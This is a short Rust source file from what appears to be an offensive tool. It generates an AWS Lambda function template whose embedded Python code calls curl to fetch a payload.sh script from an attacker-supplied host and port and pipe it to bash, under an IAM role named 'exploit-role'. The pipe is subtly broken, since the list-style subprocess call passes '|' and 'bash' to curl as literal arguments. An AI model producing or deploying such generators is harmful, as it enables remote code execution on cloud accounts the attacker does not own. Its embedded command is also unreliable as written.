// AWS Lambda/EC2 payload generator
use crate::cli::banner;

pub struct AwsGenerator;

impl AwsGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str) -> String {
        banner::print_exploiting("AWS-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        format!(
            r#"{{
  "Type": "LambdaFunction",
  "Properties": {{
    "Code": {{
      "ZipFile": "import subprocess\nsubprocess.call(['curl','-s','http://{}:{}/payload.sh','|','bash'])"
    }},
    "Handler": "index.handler",
    "Role": "arn:aws:iam::123456789012:role/exploit-role",
    "Runtime": "python3.8"
  }}
}}"#,
            lhost, lport
        )
    }
}
